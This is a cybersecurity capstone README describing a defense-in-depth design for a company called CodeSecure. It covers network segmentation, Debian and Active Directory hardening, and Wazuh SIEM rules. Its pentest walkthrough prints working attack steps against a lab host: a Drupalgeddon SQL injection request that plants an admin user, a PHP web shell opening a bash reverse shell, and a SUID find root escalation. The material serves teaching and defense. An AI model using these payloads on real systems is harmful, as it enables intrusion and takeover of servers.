# CodeSecure Infrastructure: Network Defense & Cybersecurity Capstone

[![Security Infrastructure](https://img.shields.io/badge/Infrastructure-Defense%20in%20Depth-blue?style=for-the-badge&logo=shield)](https://github.com)
[![OS Basis](https://img.shields.io/badge/Linux-Debian%2013%20Hardened-red?style=for-the-badge&logo=debian)](https://github.com)
[![Directory Services](https://img.shields.io/badge/Windows%20Server-Active%20Directory%20GPO-0078D6?style=for-the-badge&logo=windows)](https://github.com)
[![Perimeter Firewall](https://img.shields.io/badge/Firewall-pfSense%20%26%20UFW-212529?style=for-the-badge&logo=pfsense)](https://github.com)
[![SIEM & EDR](https://img.shields.io/badge/SIEM-Wazuh%20%2B%20Rsyslog%20%2B%20YARA-E6522C?style=for-the-badge&logo=wazuh)](https://github.com)
[![Framework Compliance](https://img.shields.io/badge/Framework-NIST%20CSF%20%7C%20MITRE%20ATT%26CK%20%7C%20CIS-success?style=for-the-badge)](https://github.com)

---

## 📌 Executive Summary & Project Context

This repository contains the comprehensive technical design, implementation, pentesting report, and active defense architecture for **CodeSecure, Lda.**, a medium-sized enterprise (~40 employees) specializing in custom software development and web hosting services.

CodeSecure operates a private datacenter hosting **120 production websites** and **14 client virtual machines**, alongside its internal enterprise network. Due to the high exposure of public-facing web services and the presence of sensitive customer data subject to strict data protection regulations (e.g., GDPR), this project establishes an end-to-end **Defense in Depth** architecture, replacing obsolete legacy systems with a multi-layered, resilient security infrastructure.

![CodeSecure Capstone Project Cover](images/cover_project.png)

### 🏢 Enterprise Environment & Attack Surface Overview
* **Human Resources & Workforce:** ~40 employees divided across four primary departments.
* **Hosting Surface:** 120 external websites and 14 dedicated client VMs hosted in the private datacenter.
* **Internal Departments:**
  1. **Human Resources (HR):** Personnel management, contracts, sensitive employee data.
  2. **Software Development:** Proprietary codebases, repository servers, staging environments.
  3. **Technical Support / Helpdesk:** Client support systems and remote assistance tools.
  4. **Infrastructure & Datacenter Operations:** Production servers, networking hardware, SIEM, and monitoring nodes.
* **Core Requirement:** Complete network segmentation separating internal departmental operations, datacenter infrastructure, and external multi-tenant client environments.


---

## 📑 Table of Contents
1. [Asset Risk Assessment & Threat Modeling](#-asset-risk-assessment--threat-modeling)
2. [Network Architecture & Perimeter Security](#-network-architecture--perimeter-security)
3. [Penetration Testing Walkthrough: Target DC-1](#-penetration-testing-walkthrough-target-dc-1)
4. [Linux Systems Hardening (Debian 13)](#-linux-systems-hardening-debian-13)
5. [Windows Server & Active Directory Identity Management](#-windows-server--active-directory-identity-management)
6. [SIEM, Centralized Logging & Active Response](#-siem-centralized-logging--active-response)
7. [Conclusion & Future Security Roadmap](#-conclusion--future-security-roadmap)

---

## 📊 Asset Risk Assessment & Threat Modeling

A thorough risk assessment was conducted across 19 critical assets in the CodeSecure environment. Risk scores were evaluated using the standard matrix formula:
$$\text{Risk Score} = \text{Likelihood (1--5)} \times \text{Impact (1--5)}$$

![Asset Risk Assessment](images/risk_assessment_chart.png)

### 🎯 Critical Asset Risk Matrix (Score $\ge 20$: Immediate Action)

| Asset Name | Threat Vector | Likelihood | Impact | Risk Score | Mitigation Strategy |
| :--- | :--- | :---: | :---: | :---: | :--- |
| **Access Credentials** | Identity theft, credential harvesting, total administrative compromise | 5 | 5 | **25 (Critical)** | Password rotation GPOs, SSH keys only, PAM, MFA enforcement |
| **Production Servers & Websites** | Ransomware, zero-day exploits, SQL Injection, DDoS | 4 | 5 | **20 (High)** | Automated patching, EDR/Wazuh, WAF (ModSecurity), offsite backups |
| **Public Exposed Server (DC-1)** | Unauthenticated RCE, web vulnerability exploitation | 5 | 4 | **20 (High)** | Nginx Reverse Proxy, WAF, OS deprecation & migration to Debian 13 |
| **Hosted Websites** | XSS, SQLi, LFI, RCE via CMS vulnerabilities | 5 | 4 | **20 (High)** | OWASP CRS integration, pentesting, automated vulnerability scanning |
| **External Client Data** | Unauthorized access, data exfiltration, GDPR violation fines | 4 | 5 | **20 (High)** | At-rest & in-transit encryption, strict RBAC, data isolation |
| **Internal Enterprise Network** | Lateral movement, packet sniffing, ARP spoofing | 4 | 5 | **20 (High)** | VLAN segmentation, DAI, DHCP Snooping, 802.1X Port Security |

---

## 🌐 Network Architecture & Perimeter Security

The network architecture was engineered following the **Defense in Depth** paradigm. The perimetric design guarantees that an incident in one segment remains strictly contained, preventing lateral movement to internal core databases or domain management nodes.

![Network Topology and Defense in Depth](images/network_topology.png)

### 🛡️ Core Network Hardening Controls

1. **VLAN Segmentation & Inter-VLAN ACLs:**
   * **DMZ (VLAN 80 Frontend / VLAN 70 Backend):** Public web services and Reverse Proxy nodes.
   * **Development (VLAN 10):** Isolated developer workstations and code staging environments.
   * **Human Resources (VLAN 20):** High-confidentiality segment with strict access control lists.
   * **Helpdesk (VLAN 30):** Technical support workstations separated from production datacenter.
   * **Datacenter & Management (VLAN 99):** Core switching, Domain Controllers, Wazuh SIEM, Rsyslog.

2. **Perimeter Firewall & NAT Configuration (pfSense):**
   * Configured with a default-deny posture on all interfaces.
   * **Port Forwarding (DNAT):** Inbound WAN HTTP (80) and HTTPS (443) traffic is strictly forwarded to the Nginx Reverse Proxy in the DMZ. Direct exposure of internal application servers is eliminated.

3. **Layer 2 & Layer 3 Switch Hardening:**
   * **Port Security:** Sticky MAC address limits configured per port on edge switches (`switchport port-security`).
   * **Unused Port Shutdown:** All unassigned switch ports are explicitly disabled (`shutdown`) and assigned to a dummy VLAN.
   * **DHCP Snooping & Dynamic ARP Inspection (DAI):** Prevents rogue DHCP server insertion and ARP poisoning/spoofing attacks by validating packets against the DHCP binding table.
   * **High Availability (HSRP):** Core switches run Hot Standby Router Protocol (HSRP) for continuous default gateway redundancy.
   * **Centralized AAA:** Router and switch administrative access managed via centralized RADIUS/TACACS+ server with mandatory SSHv2 encryption.

![Reverse Proxy Architecture](images/reverse_proxy_arch.png)

---

## ⚔️ Penetration Testing Walkthrough: Target DC-1

To demonstrate the critical risk posed by legacy infrastructure, a controlled penetration test was executed against the existing legacy server **DC-1** (`192.168.1.26`).

![DC-1 Vulnerability Reconnaissance](images/dc1_vulnerability_recon.png)

### 🔍 Reconnaissance & Vulnerability Discovery
1. **Network Scanning (Nmap):**
   ```bash
   nmap -sV -sC -A -p- 192.168.1.26
   ```
   * *Open Ports Discovered:* Port 80/tcp (HTTP - Apache 2.2.22), Port 22/tcp (OpenSSH 6.0p1).
2. **Web Vulnerability Scanning (Nikto & CMSRecon):**
   * Identified Drupal 7.x installation suffering from unpatched SQL Injection (`CVE-2014-3704`, widely known as **Drupalgeddon 1**).

### 💥 Exploitation Chain: SQLi to Remote Code Execution & Privilege Escalation

![DC-1 Exploit Chain](images/dc1_exploit_chain.png)

1. **Initial Access via Drupalgeddon (CVE-2014-3704):**
   * Crafted a malformed POST request to the Drupal login form abusing the expansion of the `form_build_id` array in the database abstraction layer.
   * Injected an administrative user (`pwned_admin`) into the Drupal database:
   ```http
   POST /?q=node&destination=node HTTP/1.1
   Host: 192.168.1.26
   Content-Type: application/x-www-form-urlencoded

   name[0%20%3D%20%27admin%27%20--%20]=pwned&name[0]=1&pass=admin123&form_id=user_login
   ```
2. **Reverse Shell Execution:**
   * Logged in as `pwned_admin`, enabled the PHP Filter module, and saved a custom PHP web shell payload to trigger an outbound TCP socket to the attacker machine (`192.168.1.50:4444`).
   ```php
   <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'"); ?>
   ```
3. **Privilege Escalation to Root:**
   * Enumerated SUID binaries using `find`:
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```
   * Discovered `/usr/bin/find` configured with the SUID bit set. Executed arbitrary commands as root:
   ```bash
   find . -exec /bin/sh -p \;
   # whoami
   # root
   ```

### 🎯 MITRE ATT&CK Mapping Table

| Phase | Technique ID | Technique Name | Exploited Vulnerability / Action |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Nmap & Nikto HTTP banner grabbing |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Drupal 7 `CVE-2014-3704` SQL Injection |
| **Execution** | `T1059.004` | Command and Scripting Interpreter: Unix Shell | PHP Reverse Shell execution |
| **Persistence** | `T1098` | Account Manipulation | Insertion of backdoor admin user in Drupal DB |
| **Privilege Escalation** | `T1548.001` | Abuse Elevation Control: Setuid and Setgid | Abuse of `/usr/bin/find` SUID binary |

---

## 🐧 Linux Systems Hardening (Debian 13)

To replace vulnerable legacy OS instances, all Linux web and application servers were rebuilt on **Debian 13 (Trixie)** adhering to CIS Benchmarks.

![Linux Hardening Stack](images/linux_hardening_stack.png)

### ⚙️ System Baseline & Service Security Configuration

1. **SSH Hardening (`/etc/ssh/sshd_config`):**
   * Relocated SSH port from 22 to non-standard port `2222`.
   * Explicitly disabled root login and password-based authentication.
   * Mandatory RSA 4096-bit or Ed25519 key pair authentication.
   ```ini
   Port 2222
   PermitRootLogin no
   PasswordAuthentication no
   PubkeyAuthentication yes
   MaxAuthTries 3
   ClientAliveInterval 300
   ClientAliveCountMax 2
   AllowUsers sysadmin devops
   ```

2. **Uncomplicated Firewall (UFW) Implementation:**
   ```bash
   ufw default deny incoming
   ufw default allow outgoing
   ufw allow 2222/tcp comment 'Hardened SSH'
   ufw allow 80/tcp comment 'HTTP Web Services'
   ufw allow 443/tcp comment 'HTTPS Encrypted'
   ufw enable
   ```

3. **Web Application Firewall (Nginx + ModSecurity + OWASP CRS):**
   * Deployed Nginx as a Reverse Proxy with `modsecurity_module` enabled.
   * Integrated OWASP Core Rule Set (CRS v3.3) to inspect inbound HTTP headers, cookies, and POST bodies in real-time, blocking SQLi, XSS, and LFI attacks before hitting application servers.

---

## 🪟 Windows Server & Active Directory Identity Management

Corporate user accounts, workstations, and server permissions are centrally governed via **Windows Server Active Directory Domain Services (AD DS)**.

![Windows AD GPO Identity Management](images/windows_ad_gpo.png)

### 🏢 Organizational Unit (OU) Architecture & Group Policy Objects

```text
CodeSecure.local
├── 📁 Production_Servers (Datacenter Member Servers)
├── 📁 Domain_Controllers
└── 📁 CodeSecure_Users
    ├── 📁 Administration (HR, Finance, Management)
    ├── 📁 Software_Development (Developers, DevOps)
    ├── 📁 Technical_Support (Helpdesk, Field Support)
    └── 📁 Infrastructure_Ops (Sysadmins, SOC Analysts)
```

### 🔒 Enforced Group Policies (GPOs)

1. **Password Complexity & Account Lockout Policy:**
   * Minimum password length: **14 characters**.
   * Password history enforcement: **24 remembered passwords**.
   * Maximum password age: **90 days**.
   * Account Lockout Threshold: **5 failed logon attempts** within 15 minutes triggers a **30-minute lockout**.

2. **User Rights Assignment & LAPS:**
   * Local Administrator Password Solution (LAPS) deployed to auto-rotate unique local administrator passwords across all domain workstations daily.
   * Prevented non-administrative domain users from logging on locally to Domain Controllers or server consoles.

3. **Advanced Security Audit Policy:**
   * Enabled detailed auditing for Account Logon, Object Access, Privilege Use, and Process Creation (Event ID `4688` with Command Line Logging enabled).

---

## 🛡️ SIEM, Centralized Logging & Active Response

To ensure continuous visibility across all endpoints, network switches, firewalls, and servers, a centralized **Wazuh SIEM & EDR** cluster was deployed alongside **Rsyslog over TLS**.

![SIEM Logging Pipeline](images/siem_logging_pipeline.png)

### 🔄 Centralized Log Aggregation Architecture
1. **Rsyslog Collector:** Centralizes syslogs from pfSense firewalls, managed switches, and Linux web servers over encrypted TLS transport (`port 6514`).
2. **Wazuh Agents:** Installed across Linux application servers and Windows Server AD, streaming file integrity monitoring (FIM) and system audit events to the Wazuh Manager.
3. **YARA Engine Integration:** Embedded with Wazuh agents to automatically scan created or modified files in `/var/www/` and `/tmp/` against custom malware signatures.

![Wazuh Active Response](images/wazuh_active_response.png)

### ⚡ Automated Active Response Trigger Rules
When brute-force authentication, web scanning, or privilege escalation attempts are detected, Wazuh triggers automated active response scripts:

```xml
<!-- Custom Wazuh Rule: Detect Web Shell Creation & Block Source IP -->
<group name="syscheck,yara,active_response">
  <rule id="100201" level="12">
    <if_sid>550</if_sid>
    <match>YARA Rule Match: PHP_Webshell_Pattern</match>
    <description>Critical: Webshell drop detected in web root by YARA scanner!</description>
    <mitre>
      <id>T1505.003</id>
    </mitre>
  </rule>

  <rule id="100202" level="10">
    <if_matched_sid>31100</if_matched_sid>
    <same_source_ip />
    <frequency>5</frequency>
    <timeframe>60</timeframe>
    <description>Multiple Web Attack attempts detected from same IP within 60s.</description>
    <mitre>
      <id>T1190</id>
    </mitre>
  </rule>
</group>
```

* **Active Response Action:** Triggers firewall block script (`firewall-drop`) to append the offending source IP address to the UFW/pfSense blocklist for 24 hours automatically.

---

## 🏁 Conclusion & Future Security Roadmap

The implementation of this **Defense in Depth** framework successfully elevates CodeSecure, Lda. from a vulnerable, monolithic enterprise state to a hardened, resilient infrastructure aligned with industry standards (**NIST CSF**, **CIS Benchmarks**, and **GDPR**).

### 🚀 Strategic Next Steps
1. **Multi-Factor Authentication (MFA):** Enforce TOTP/FIDO2 hardware security keys across all VPN access points and Active Directory logons.
2. **Zero Trust Network Access (ZTNA):** Transition from legacy site-to-site VPN to identity-aware micro-segmentation proxying.
3. **Continuous Penetration Testing:** Schedule bi-annual black-box and grey-box pentests to validate new software deployments and infrastructure changes.

---

### 📄 License
This repository is released under the terms of the [MIT License](LICENSE).
